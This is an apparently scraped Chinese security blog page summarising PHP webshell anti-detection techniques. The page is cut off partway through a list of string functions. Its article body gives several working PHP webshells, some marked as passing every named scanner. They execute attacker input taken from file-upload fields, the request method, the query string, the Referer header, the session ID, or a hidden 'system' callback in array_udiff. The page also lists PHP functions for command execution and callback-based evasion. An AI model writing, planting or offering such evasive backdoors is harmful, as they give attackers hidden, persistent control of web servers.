@@ -1,0 +1,1606 @@
+
+<!doctype html>
+<html lang="zh" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      
+        <meta name="description" content="Longlone's Blog about daily and security.">
+      
+      
+      
+      
+        <link rel="canonical" href="https://longlone.best/%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/webshell%E5%85%8D%E6%9D%80%E6%80%BB%E7%BB%93/">
+      
+      <link rel="icon" href="../../../attachment/favicon.ico">
+      <meta name="generator" content="mkdocs-1.1.2, mkdocs-material-7.1.6">
+    
+    
+      
+        <title>webshell免杀总结 - Longlone's Blog</title>
+      
+    
+    
+      <link rel="stylesheet" href="../../../assets/stylesheets/main.875de78c.min.css">
+      
+        
+        <link rel="stylesheet" href="../../../assets/stylesheets/palette.f1a3b89f.min.css">
+        
+          
+          
+          <meta name="theme-color" content="#7e56c2">
+        
+      
+    
+    
+    
+      
+    
+    
+    
+    
+      
+    
+    
+  </head>
+  
+  
+    
+    
+    
+    
+    
+    <body dir="ltr" data-md-color-scheme="slate" data-md-color-primary="deep-purple" data-md-color-accent="indigo">
+  
+    
+    <script>function __prefix(e){return new URL("../../..",location).pathname+"."+e}function __get(e,t=localStorage){return JSON.parse(t.getItem(__prefix(e)))}</script>
+    
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" for="__drawer"></label>
+    <div data-md-component="skip">
+      
+        
+        <a href="#webshell免杀总结" class="md-skip">
+          跳转至
+        </a>
+      
+    </div>
+    <div data-md-component="announce">
+      
+    </div>
+    
+      <header class="md-header" data-md-component="header">
+  <nav class="md-header__inner md-grid" aria-label="Header">
+    <a href="../../.." title="Longlone&#39;s Blog" class="md-header__button md-logo" aria-label="Longlone's Blog" data-md-component="logo">
+      
+  <img src="../../../attachment/logo.svg" alt="logo">
+
+    </a>
+    <label class="md-header__button md-icon" for="__drawer">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3V6m0 5h18v2H3v-2m0 5h18v2H3v-2z"/></svg>
+    </label>
+    <div class="md-header__title" data-md-component="header-title">
+      <div class="md-header__ellipsis">
+        <div class="md-header__topic">
+          <span class="md-ellipsis">
+            Longlone's Blog
+          </span>
+        </div>
+        <div class="md-header__topic" data-md-component="header-topic">
+          <span class="md-ellipsis">
+            
+              webshell免杀总结
+            
+          </span>
+        </div>
+      </div>
+    </div>
+    
+    
+    
+      <label class="md-header__button md-icon" for="__search">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5z"/></svg>
+      </label>
+      
+<div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" aria-label="搜索" placeholder="搜索" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" data-md-state="active" required>
+      <label class="md-search__icon md-icon" for="__search">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5z"/></svg>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12z"/></svg>
+      </label>
+      <button type="reset" class="md-search__icon md-icon" aria-label="Clear" tabindex="-1">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12 19 6.41z"/></svg>
+      </button>
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="search-result">
+          <div class="md-search-result__meta">
+            正在初始化搜索引擎
+          </div>
+          <ol class="md-search-result__list"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+    
+  </nav>
+</header>
+    
+    <div class="md-container" data-md-component="container">
+      
+      
+        
+      
+      <main class="md-main" data-md-component="main">
+        <div class="md-main__inner md-grid">
+          
+            
+              
+              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+
+  
+
+<nav class="md-nav md-nav--primary md-nav--integrated" aria-label="Navigation" data-md-level="0">
+  <label class="md-nav__title" for="__drawer">
+    <a href="../../.." title="Longlone&#39;s Blog" class="md-nav__button md-logo" aria-label="Longlone's Blog" data-md-component="logo">
+      
+  <img src="../../../attachment/logo.svg" alt="logo">
+
+    </a>
+    Longlone's Blog
+  </label>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+      
+
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../.." class="md-nav__link">
+        Index
+      </a>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../%E5%8F%8B%E6%83%85%E9%93%BE%E6%8E%A5/" class="md-nav__link">
+        友情链接
+      </a>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+    
+  
+  
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_3" type="checkbox" id="__nav_3" checked>
+      
+      <label class="md-nav__link" for="__nav_3">
+        安全
+        <span class="md-nav__icon md-icon"></span>
+      </label>
+      <nav class="md-nav" aria-label="安全" data-md-level="1">
+        <label class="md-nav__title" for="__nav_3">
+          <span class="md-nav__icon md-icon"></span>
+          安全
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_3_1" data-md-state="indeterminate" type="checkbox" id="__nav_3_1" checked>
+      
+      <label class="md-nav__link" for="__nav_3_1">
+        Golang
+        <span class="md-nav__icon md-icon"></span>
+      </label>
+      <nav class="md-nav" aria-label="Golang" data-md-level="2">
+        <label class="md-nav__title" for="__nav_3_1">
+          <span class="md-nav__icon md-icon"></span>
+          Golang
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../golang/%E7%AC%AC%E4%B8%80%E7%AB%A0-Golang%E5%9F%BA%E7%A1%80/" class="md-nav__link">
+        第一章-Golang基础
+      </a>
+    </li>
+  
+
+          
+            
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../golang/%E7%AC%AC%E4%B8%89%E7%AB%A0-HTTP/" class="md-nav__link">
+        第三章-HTTP
+      </a>
+    </li>
+  
+
+          
+            
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../golang/%E7%AC%AC%E4%BA%8C%E7%AB%A0-%E7%BD%91%E7%BB%9C%E8%BF%9E%E6%8E%A5/" class="md-nav__link">
+        第二章-网络连接
+      </a>
+    </li>
+  
+
+          
+            
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../golang/%E7%AC%AC%E4%BA%94%E7%AB%A0-DNS/" class="md-nav__link">
+        第五章-DNS
+      </a>
+    </li>
+  
+
+          
+            
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../golang/%E7%AC%AC%E5%9B%9B%E7%AB%A0-HTTP%E6%9C%8D%E5%8A%A1%E5%99%A8/" class="md-nav__link">
+        第四章-HTTP服务器
+      </a>
+    </li>
+  
+
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+          
+            
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_3_2" data-md-state="indeterminate" type="checkbox" id="__nav_3_2" checked>
+      
+      <label class="md-nav__link" for="__nav_3_2">
+        前人之路
+        <span class="md-nav__icon md-icon"></span>
+      </label>
+      <nav class="md-nav" aria-label="前人之路" data-md-level="2">
+        <label class="md-nav__title" for="__nav_3_2">
+          <span class="md-nav__icon md-icon"></span>
+          前人之路
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../%E5%89%8D%E4%BA%BA%E4%B9%8B%E8%B7%AF/thinkphp%205.1.x%20RCE/" class="md-nav__link">
+        thinkphp 5.1.x RCE
+      </a>
+    </li>
+  
+
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+          
+            
+  
+  
+    
+  
+  
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_3_3" type="checkbox" id="__nav_3_3" checked>
+      
+      <label class="md-nav__link" for="__nav_3_3">
+        安全研究
+        <span class="md-nav__icon md-icon"></span>
+      </label>
+      <nav class="md-nav" aria-label="安全研究" data-md-level="2">
+        <label class="md-nav__title" for="__nav_3_3">
+          <span class="md-nav__icon md-icon"></span>
+          安全研究
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../register_argc_argv%E4%B8%8Einclude%E9%99%90%E5%88%B6php%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E7%9A%84%E5%B0%8F%E7%BB%93/" class="md-nav__link">
+        register_argc_argv与include限制php任意文件下载的小结
+      </a>
+    </li>
+  
+
+          
+            
+  
+  
+    
+  
+  
+    <li class="md-nav__item md-nav__item--active">
+      
+      <input class="md-nav__toggle md-toggle" data-md-toggle="toc" type="checkbox" id="__toc">
+      
+      
+        
+      
+      
+        <label class="md-nav__link md-nav__link--active" for="__toc">
+          webshell免杀总结
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <a href="./" class="md-nav__link md-nav__link--active">
+        webshell免杀总结
+      </a>
+      
+        
+<nav class="md-nav md-nav--secondary" aria-label="目录">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      目录
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#免杀技术基础" class="md-nav__link">
+    免杀技术基础
+  </a>
+  
+    <nav class="md-nav" aria-label="免杀技术基础">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#前言" class="md-nav__link">
+    前言
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#另类的入口" class="md-nav__link">
+    另类的入口
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#变形与伪装" class="md-nav__link">
+    变形与伪装
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#符号干扰" class="md-nav__link">
+    符号干扰
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#别名重命名" class="md-nav__link">
+    别名/重命名
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+      
+    </li>
+  
+
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../tags.html" class="md-nav__link">
+        Tags
+      </a>
+    </li>
+  
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+          
+          <div class="md-content" data-md-component="content">
+            <article class="md-content__inner md-typeset">
+              
+    
+        
+            <a href = "/tags.html#webshell" title="webshell" class="md-tag">
+                #webshell&nbsp;
+            </a>
+        
+            <a href = "/tags.html#php" title="php" class="md-tag">
+                #php&nbsp;
+            </a>
+        
+    
+    
+    
+    <div style="float:right"><span id="busuanzi_container_page_pv"><font size="2" color="grey">本文阅读量&nbsp;<span id="busuanzi_value_page_pv"></span></font></span></div>
+    
+  
+                
+                
+                <h1 id="webshell免杀总结">webshell免杀总结<a class="headerlink" href="#webshell免杀总结" title="Permanent link">#</a></h1>
+<p><strong>以下内容基于PHP7</strong></p>
+<p><em>最近对webshell的免杀机制产生了浓厚的兴趣,于是开始进行研究,参考了网上许许多多的文章,以下是我对webshell免杀的一些总结</em></p>
+<p><strong>使用以下网站及免杀工具进行免杀测试(带星号的表示我认为检测效果比较好的工具/网站):</strong></p>
+<ul>
+<li>
+<p><a href="https://webshellchop.chaitin.cn/">webshellchop 长亭(*)</a></p>
+</li>
+<li>
+<p><a href="http://webshell.cdxy.me/">深度学习</a></p>
+</li>
+<li>
+<p><a href="https://scanner.baidu.com/">WEBDIR+ 百度(*)</a></p>
+</li>
+<li>
+<p><a href="https://n.shellpub.com/">河马在线查杀</a></p>
+</li>
+<li>
+<p><a href="http://www.d99net.net/">D盾</a></p>
+</li>
+<li>
+<p><a href="https://www.safedog.cn">安全狗</a></p>
+</li>
+</ul>
+<p><strong>参考文章:</strong></p>
+<ul>
+<li>
+<p><a href="https://www.freebuf.com/articles/web/155891.html">https://www.freebuf.com/articles/web/155891.html</a></p>
+</li>
+<li>
+<p><a href="https://bbs.symbo1.com/t/topic/94">https://bbs.symbo1.com/t/topic/94</a></p>
+</li>
+<li>
+<p><a href="https://www.leavesongs.com/PENETRATION/php-callback-backdoor.html">https://www.leavesongs.com/PENETRATION/php-callback-backdoor.html</a></p>
+</li>
+<li>
+<p><a href="https://xz.aliyun.com/t/5152">https://xz.aliyun.com/t/5152</a></p>
+</li>
+<li>
+<p><a href="http://webshell.cdxy.me/">http://webshell.cdxy.me/</a> 下的评论</p>
+</li>
+<li>
+<p>...</p>
+</li>
+</ul>
+<h2 id="免杀技术基础">免杀技术基础<a class="headerlink" href="#免杀技术基础" title="Permanent link">#</a></h2>
+<h3 id="前言">前言<a class="headerlink" href="#前言" title="Permanent link">#</a></h3>
+<p><strong>对于webshell的免杀而言,PHP5与PHP7有很大的不同,在PHP7之后,assert这个马儿常用的函数变成了一种类似于eval的语法构造,这使得我们无法通过动态函数的方式来调用assert,这无疑是对免杀的一次沉重打击.(经过严格测试,在PHP7.0.33中依然可以,猜测应该是PHP7.1以后),因此我们需要转变思路了.标有(ALLKILL)字样的webshell通过了本文提到的所有查杀</strong></p>
+<h3 id="另类的入口">另类的入口<a class="headerlink" href="#另类的入口" title="Permanent link">#</a></h3>
+<p><strong>我们常见的webshell入口都是<em>GET,</em>POST之类的,但是其实一切的入口我们都可以进行利用,以此来逃过查杀:</strong></p>
+<ul>
+<li>
+<p>$_GET</p>
+</li>
+<li>
+<p>$_POST</p>
+</li>
+<li>
+<p>$_COOKIE</p>
+</li>
+<li>
+<p>$_REQUEST</p>
+</li>
+<li>
+<p>$<em>SERVER  其中的某些参数可控,如REQUEST</em>METHOD,QUERY<em>STRING,HTTP</em>USER_AGENT等</p>
+</li>
+<li>
+<p>session_id()  这个比较特殊,但是依然可以利用</p>
+</li>
+<li>
+<p>$_FILE</p>
+</li>
+<li>
+<p>$GLOBALS</p>
+</li>
+<li>
+<p>getallheaders()</p>
+</li>
+<li>
+<p>get<em>defined</em>vars()</p>
+</li>
+<li>
+<p>get<em>defined</em>functions()</p>
+</li>
+</ul>
+<p><strong>下面举几个例子:</strong></p>
+<div class="highlight"><pre><span></span><code><span class="cp">&lt;?php</span>
+<span class="o">@</span><span class="k">eval</span><span class="p">(</span><span class="nb">urldecode</span><span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;file&#39;</span><span class="p">][</span><span class="s1">&#39;name&#39;</span><span class="p">]));</span>  <span class="c1">// 该马会把双引号给URL编码,</span>
+                                           <span class="c1">// 因此如果payload中有双引号则需要套一层urldecode</span>
+<span class="o">@</span><span class="k">eval</span><span class="p">(</span><span class="nb">urldecode</span><span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;file&#39;</span><span class="p">][</span><span class="s1">&#39;type&#39;</span><span class="p">]));</span>  <span class="c1">// 该p马会把分号吃掉,因此需要对分号进行编码如URL编码(%3B)</span>
+                                           <span class="c1">//因此需要套一层urldecode</span>
+
+<span class="cp">?&gt;</span><span class="x"></span>
+</code></pre></div>
+<div class="highlight"><pre><span></span><code><span class="cp">&lt;?php</span>
+<span class="o">@</span><span class="k">eval</span><span class="p">(</span><span class="nb">hex2bin</span><span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;REQUEST_METHOD&#39;</span><span class="p">]));</span>  <span class="c1">// 该马通过设置请求方式来实现执行,由于符号问题</span>
+                                            <span class="c1">// 需要用bin2hex对payload进行编码</span>
+<span class="cp">?&gt;</span><span class="x"></span>
+</code></pre></div>
+<div class="highlight"><pre><span></span><code><span class="cp">&lt;?php</span>
+<span class="nv">$a</span><span class="o">=</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;QUERY_STRING&#39;</span><span class="p">];</span>  <span class="c1">//例子 ?php=info()&amp;</span>
+<span class="nv">$a</span><span class="o">=</span><span class="nb">str_replace</span><span class="p">(</span><span class="s2">&quot;&amp;&quot;</span><span class="p">,</span><span class="s2">&quot;;&quot;</span><span class="p">,</span> <span class="nv">$a</span><span class="p">);</span>
+<span class="nv">$a</span><span class="o">=</span><span class="nb">str_replace</span><span class="p">(</span><span class="s2">&quot;=&quot;</span><span class="p">,</span><span class="s2">&quot;&quot;</span><span class="p">,</span> <span class="nv">$a</span><span class="p">);</span>
+<span class="o">@</span><span class="k">eval</span><span class="p">(</span><span class="nv">$a</span><span class="p">);</span>
+<span class="cp">?&gt;</span><span class="x"></span>
+</code></pre></div>
+<div class="highlight"><pre><span></span><code><span class="cp">&lt;?php</span>
+<span class="o">@</span><span class="k">eval</span><span class="p">(</span><span class="nb">getallheaders</span><span class="p">()[</span><span class="s1">&#39;Referer&#39;</span><span class="p">]);</span>
+</code></pre></div>
+<div class="highlight"><pre><span></span><code><span class="cp">&lt;?php</span>
+ <span class="c1">// (ALLKILL)</span>
+<span class="nb">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+<span class="k">eval</span><span class="p">(</span><span class="k">null</span><span class="o">.</span><span class="nb">implode</span><span class="p">(</span><span class="nb">reset</span><span class="p">(</span><span class="nb">get_defined_vars</span><span class="p">())));</span>  <span class="c1">// php&gt;=5.5 ?a=echo 1;</span>
+<span class="cp">?&gt;</span><span class="x"></span>
+</code></pre></div>
+<div class="highlight"><pre><span></span><code><span class="cp">&lt;?php</span>  
+ <span class="c1">// (ALLKILL)</span>
+<span class="nb">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+<span class="nb">define</span><span class="p">(</span><span class="s2">&quot;SS&quot;</span><span class="p">,</span> <span class="s2">&quot;session_start&quot;</span><span class="p">);</span>
+<span class="k">function</span> <span class="nf">result</span><span class="p">(</span><span class="nv">$arg</span><span class="p">)</span>
+<span class="p">{</span>
+  <span class="k">return</span> <span class="mi">1</span> <span class="o">&gt;</span> <span class="mi">0</span> <span class="o">?</span> <span class="o">@</span><span class="nv">$arg</span> <span class="o">:</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>
+<span class="k">function</span> <span class="nf">hex22bin</span><span class="p">(</span><span class="nv">$data</span><span class="p">)</span> <span class="p">{</span>
+     <span class="nv">$len</span> <span class="o">=</span> <span class="nb">strlen</span><span class="p">(</span><span class="nv">$data</span><span class="p">);</span>
+     <span class="k">return</span> <span class="nb">pack</span><span class="p">(</span><span class="s2">&quot;H&quot;</span> <span class="o">.</span> <span class="nv">$len</span><span class="p">,</span> <span class="nv">$data</span><span class="p">);</span> <span class="p">}</span> 
+<span class="k">class</span> <span class="nc">deal</span><span class="p">{</span>
+  <span class="k">function</span> <span class="nf">combine_var</span><span class="p">(</span><span class="nv">$default</span><span class="o">=</span><span class="k">NULL</span><span class="p">){</span>
+    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">constant</span><span class="p">(</span><span class="s2">&quot;SS&quot;</span><span class="p">))</span> <span class="p">{</span>
+      <span class="k">return</span> <span class="nv">$default</span><span class="p">;</span>
+    <span class="p">}</span>
+    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">preg_match</span><span class="p">(</span><span class="s1">&#39;/\w+/&#39;</span><span class="p">,</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">sess</span><span class="p">))</span> <span class="p">{</span>
+      <span class="k">throw</span> <span class="k">new</span> <span class="nx">Exception</span><span class="p">(</span><span class="s2">&quot;</span><span class="si">$this-&gt;sess</span><span class="s2"> error&quot;</span><span class="p">);</span>
+    <span class="p">}</span>
+    <span class="nv">$results</span><span class="o">=</span><span class="k">null</span><span class="p">;</span>  <span class="c1">//trash</span>
+    <span class="nv">$results</span> <span class="o">=</span> <span class="nx">result</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">sess</span><span class="p">);</span>
+    <span class="o">@</span><span class="k">eval</span><span class="p">(</span><span class="s2">&quot;</span><span class="si">$this-&gt;sess</span><span class="s2">&quot;</span><span class="p">);</span><span class="c1">// PHP&gt;=5.4</span>
+    <span class="c1">// Cookie: PHPSESSID=706870696e666f28293b == phpinfo(); hex2bin(&quot;phpinfo();&quot;) =&gt; 706870696e666f28293b</span>
+  <span class="p">}</span>
+  <span class="k">function</span> <span class="fm">__construct</span><span class="p">(</span><span class="nv">$arg</span><span class="p">){</span>
+    <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">sess</span> <span class="o">=</span> <span class="nv">$arg</span><span class="p">;</span>
+    <span class="k">return</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">combine_var</span><span class="p">();</span>
+  <span class="p">}</span>
+<span class="p">}</span>
+<span class="nv">$son</span> <span class="o">=</span> <span class="nb">constant</span><span class="p">(</span><span class="s2">&quot;SS&quot;</span><span class="p">);</span>
+<span class="nv">$son</span><span class="p">();</span>
+<span class="nv">$sessionid</span> <span class="o">=</span> <span class="nb">session_id</span><span class="p">();</span>
+<span class="nv">$sessionid</span> <span class="o">=</span> <span class="nx">hex22bin</span><span class="p">(</span><span class="nv">$sessionid</span><span class="p">);</span>
+<span class="nv">$deals</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">deal</span><span class="p">(</span><span class="nv">$sessionid</span><span class="p">);</span>
+<span class="cp">?&gt;</span><span class="x"></span>
+</code></pre></div>
+<p><strong>其中比较值得注意的是GLOBALS,get<em>defined</em>vars(),getallheaders()<br />
+GLOBALS,get<em>defined</em>vars():<br />
+一个是超全局变量,一个是函数,返回值都是一个多维数组,包含了<em>GET,</em>POST等其他超全局变量,可以借此来对裸露的输入进行嵌套,如用GLOBALS['<em>POST'][1]代替</em>POST[1]<br />
+getallheaders():<br />
+获取所有的请求头(该函数拥有一些限制,具体请参照<a href="https://www.php.net/manual/en/function.getallheaders.php">这里</a>)<br />
+同样可以借此来尝试逃过对输入的检查</strong></p>
+<p><strong>这里再说几个PHP的函数</strong></p>
+<p>pos(),current(),reset():这三个函数的返回值都是传入数组的一个元素<br />
+next():这个函数的返回值是传入数组的第二个元素<br />
+end():这个函数的返回值是传入数组的最后一个元素<br />
+implode():可以将数组中的元素拼接起来,如拼接成字符串</p>
+<p>可以看到<strong>evil5.php</strong>中我们仅仅对输入进行处理,拼接null就躲过了所有的查杀.</p>
+<p>除了上述方法之外,我们也可以尝试从不同的"门"进入,如执行系统命令:</p>
+<ul>
+<li>
+<p>system()</p>
+</li>
+<li>
+<p>exec()</p>
+</li>
+<li>
+<p>shell_exec()</p>
+</li>
+<li>
+<p>passthru()</p>
+</li>
+<li>
+<p>proc_open()</p>
+</li>
+<li>
+<p>``  // 反引号执行系统命令</p>
+</li>
+</ul>
+<p>或者使用一些匿名函数,动态调用函数,回调函数:</p>
+<ul>
+<li>
+<p>call<em>user</em>func</p>
+</li>
+<li>
+<p>call<em>user</em>func_array</p>
+</li>
+<li>
+<p>array_filter</p>
+</li>
+<li>
+<p>array_map</p>
+</li>
+<li>
+<p>uasort, uksort</p>
+</li>
+<li>
+<p>array_reduce</p>
+</li>
+<li>
+<p>array_udiff</p>
+</li>
+<li>
+<p>array_walk</p>
+</li>
+<li>
+<p>array<em>walk</em>recursive</p>
+</li>
+<li>
+<p>preg<em>replace, mb</em>ereg_replace</p>
+</li>
+<li>
+<p>preg_filter</p>
+</li>
+<li>
+<p>register<em>shutdown</em>function</p>
+</li>
+<li>
+<p>register<em>tick</em>function</p>
+</li>
+<li>
+<p>filter_var</p>
+</li>
+<li>
+<p>filter<em>var</em>array</p>
+</li>
+<li>
+<p>类的反射-&gt;invoke()</p>
+</li>
+<li>
+<p>include</p>
+</li>
+<li>
+<p>file<em>get</em>contents</p>
+</li>
+<li>
+<p>create<em>function // 我尝试用create</em>function来创造免杀webshell,但似乎总是绕不过长亭</p>
+</li>
+</ul>
+<div class="highlight"><pre><span></span><code><span class="cp">&lt;?php</span>  
+<span class="c1">// (ALLKILL)</span>
+<span class="nb">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+
+<span class="k">function</span> <span class="nf">compare_by_area</span><span class="p">(</span><span class="nv">$a</span><span class="p">,</span> <span class="nv">$b</span><span class="p">)</span> <span class="p">{</span>
+    <span class="nv">$areaA</span> <span class="o">=</span> <span class="nb">substr</span><span class="p">(</span><span class="nv">$a</span><span class="o">-&gt;</span><span class="na">width</span> <span class="o">.</span> <span class="nv">$a</span><span class="o">-&gt;</span><span class="na">height</span><span class="p">,</span> <span class="mi">4</span><span class="p">);</span>
+    <span class="nv">$areaB</span> <span class="o">=</span> <span class="nb">substr</span><span class="p">(</span><span class="nv">$b</span><span class="o">-&gt;</span><span class="na">width</span> <span class="o">.</span> <span class="nv">$b</span><span class="o">-&gt;</span><span class="na">height</span><span class="p">,</span> <span class="mi">4</span><span class="p">);</span>
+    <span class="k">if</span> <span class="p">(</span><span class="nv">$areaA</span><span class="p">(</span><span class="nv">$areaB</span><span class="p">))</span> <span class="p">{</span>
+        <span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
+    <span class="p">}</span> <span class="k">elseif</span> <span class="p">(</span><span class="nv">$areaA</span> <span class="o">==</span> <span class="nv">$areaB</span><span class="p">)</span> <span class="p">{</span>
+        <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
+    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+        <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+
+<span class="nv">$array1</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="k">new</span> <span class="k">stdclass</span><span class="p">);</span>
+<span class="nv">$array1</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">-&gt;</span><span class="na">width</span> <span class="o">=</span> <span class="s1">&#39;code&#39;</span><span class="p">;</span>
+<span class="nv">$array1</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">-&gt;</span><span class="na">height</span> <span class="o">=</span> <span class="s1">&#39;sys&#39;</span><span class="o">.</span><span class="s1">&#39;tem&#39;</span><span class="p">;</span>
+<span class="nv">$array2</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="k">new</span> <span class="k">stdclass</span><span class="p">);</span>
+<span class="nv">$array2</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">-&gt;</span><span class="na">width</span> <span class="o">=</span> <span class="s1">&#39;args&#39;</span><span class="p">;</span>
+<span class="nv">$array2</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">-&gt;</span><span class="na">height</span> <span class="o">=</span> <span class="nb">pos</span><span class="p">(</span><span class="nb">next</span><span class="p">(</span><span class="nv">$GLOBALS</span><span class="p">));</span>
+<span class="nb">array_udiff</span><span class="p">(</span><span class="nv">$array1</span><span class="p">,</span> <span class="nv">$array2</span><span class="p">,</span> <span class="s1">&#39;compare_by_area&#39;</span><span class="p">);</span>  <span class="c1">// PHP &gt;=5.3</span>
+</code></pre></div>
+<p><strong>总的来说,入口千万条,安全第一条,免杀不到位,面壁空流泪.各位师傅们可以自行测试下这些入口</strong></p>
+<h3 id="变形与伪装">变形与伪装<a class="headerlink" href="#变形与伪装" title="Permanent link">#</a></h3>
+<p><strong>变形可能是我们最常见的bypass手段了,但仍然是我们通过动态检测的好手段,PHP中自带了大量对字符串进行处理变形与编码的函数,我们可以借此对我们的webshell进行操作</strong></p>
+<p>以下是一些PHP自带的函数:</p>
+<ul>
+<li>
+<p>substr_replace</p>
+</li>
+<li>
+<p>substr</p>
+</li>
+<li>
+<p>strtr</p>
+</li>
+<li>
+<p>str_rot13</p>
+</li>
+<li>
+<p>base64_encode</p>
+</li>
+<li>
+<p>chr</p>
+</li>
+<li>
